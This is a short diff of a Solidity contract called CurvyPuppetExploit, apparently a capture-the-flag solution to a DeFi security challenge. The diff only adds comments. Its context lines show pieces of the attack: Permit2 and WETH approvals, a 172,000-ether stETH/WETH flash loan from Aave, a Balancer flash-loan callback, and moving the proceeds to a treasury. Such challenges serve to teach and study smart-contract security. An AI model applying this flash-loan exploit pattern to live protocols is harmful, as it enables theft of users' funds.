@@ -258,6 +258,7 @@ contract CurvyPuppetExploit {
         charlie = _charlie;
     }
 
+    ///@dev Aave Flashloan
     function executeExploit() external {
         curveLpToken.approve(address(permit2), type(uint256).max);
         permit2.approve({
@@ -271,8 +272,8 @@ contract CurvyPuppetExploit {
         weth.approve(address(AAVE_V2), type(uint256).max);
 
         address[] memory assets = new address[](2);
-        assets[0] = address(stETH);
-        assets[1] = address(weth);
+        assets[0] = address(stETH); //LPToken (borrowAsset)
+        assets[1] = address(weth); // Collateral 
 
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 172_000 ether;
@@ -290,6 +291,7 @@ contract CurvyPuppetExploit {
         stETH.transfer(treasury, stETH.balanceOf(address(this)));
     }
 
+    ///@dev Aave Callback
     function executeOperation(
         address[] memory,
         uint256[] memory,
@@ -308,6 +310,7 @@ contract CurvyPuppetExploit {
         return true;
     }
 
+    ///@dev balancer callback
     function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
         require(msg.sender == address(BALANCER_VAULT), "not balancer");
 
